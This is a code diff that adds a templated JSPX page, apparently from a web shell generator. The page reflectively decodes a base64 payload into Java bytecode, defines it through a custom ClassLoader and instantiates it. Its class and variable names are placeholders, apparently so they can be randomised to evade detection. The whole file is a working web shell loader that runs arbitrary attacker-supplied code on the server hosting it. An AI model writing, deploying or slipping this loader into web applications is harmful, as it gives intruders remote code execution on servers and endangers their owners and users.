@@ -1,0 +1,29 @@
+<jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page">
+    <jsp:directive.page contentType="text/html"/>
+    <jsp:directive.page pageEncoding="UTF-8"/>
+    <jsp:declaration><![CDATA[
+        public static class {{CLS:Definer}} extends ClassLoader {
+            public {{CLS:Definer}}(ClassLoader {{VAR:cl}}) {
+                super({{VAR:cl}});
+            }
+            public Class defineClass(byte[] {{VAR:buf}}) {
+                return defineClass(null, {{VAR:buf}}, 0, {{VAR:buf}}.length);
+            }
+        }
+        ]]></jsp:declaration>
+    <jsp:scriptlet><![CDATA[
+        ClassLoader {{VAR:ctxLoader}} = Thread.currentThread().getContextClassLoader();
+        String {{VAR:payload}} = "{{base64Str}}";
+        byte[] {{VAR:bytecode}} = null;
+        try {
+            Class {{VAR:b64Cls}} = {{VAR:ctxLoader}}.loadClass("java.util.Base64");
+            Object {{VAR:decoder}} = {{VAR:b64Cls}}.getMethod("getDecoder").invoke(null);
+            {{VAR:bytecode}} = (byte[]) {{VAR:decoder}}.getClass().getMethod("decode", String.class).invoke({{VAR:decoder}}, {{VAR:payload}});
+        } catch (ClassNotFoundException {{VAR:ex}}) {
+            Class {{VAR:dtcCls}} = {{VAR:ctxLoader}}.loadClass("javax.xml.bind.DatatypeConverter");
+            {{VAR:bytecode}} = (byte[]) {{VAR:dtcCls}}.getMethod("parseBase64Binary", String.class).invoke(null, {{VAR:payload}});
+        }
+        Class {{VAR:clazz}} = new {{CLS:Definer}}({{VAR:ctxLoader}}).defineClass({{VAR:bytecode}});
+        {{VAR:clazz}}.newInstance();
+        ]]></jsp:scriptlet>
+</jsp:root>
